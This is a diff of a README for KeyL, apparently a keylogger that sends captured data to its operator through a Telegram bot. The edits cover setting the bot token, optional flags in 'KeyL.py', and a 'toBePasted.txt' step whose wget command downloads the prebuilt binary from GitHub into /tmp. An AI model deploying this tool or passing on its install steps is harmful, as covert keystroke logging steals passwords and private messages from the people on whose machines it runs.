@@ -17,18 +17,18 @@ But before you need to configure it for your own setup. Here's how:
 
 1. **Set Your Telegram Token (Mandatory)**  
    Open `config.py` and insert your Telegram bot token.  
-   > If you’re unsure how to get one, just ask ChatGPT or refer to the [Telegram Bot API docs](https://core.telegram.org/bots).
+   > If you’re unsure how to get one, it's easy stuff just ask ChatGPT.
 
 2. **Customize Logger Behavior (Optional)**  
-   You can configure the logger by modifying flags inside `KeyL.py`.  
-   If you make changes, you'll need to build your own version to install.
+   If you're geek enough you can configure the logger by modifying flags inside `KeyL.py`.  
+   If you make changes, you'll need to build your own version to install:
+   By default, `toBePasted.txt` installs the static version hosted on GitHub:
+   ```bash
+   wget -O /tmp/keyl https://raw.githubusercontent.com/fortigate3600/KeyL/main/keyl
+   ```
 
-By default, `toBePasted.txt` installs the static version hosted on GitHub:
-```bash
-wget -O /tmp/keyl https://raw.githubusercontent.com/fortigate3600/KeyL/main/keyl
-```
 
-
+### Important:
 Before starting the program, send a dummy message to the Telegram bot.
 This is necessary for the bot to retrieve your chat_id and be able to respond to you.
 
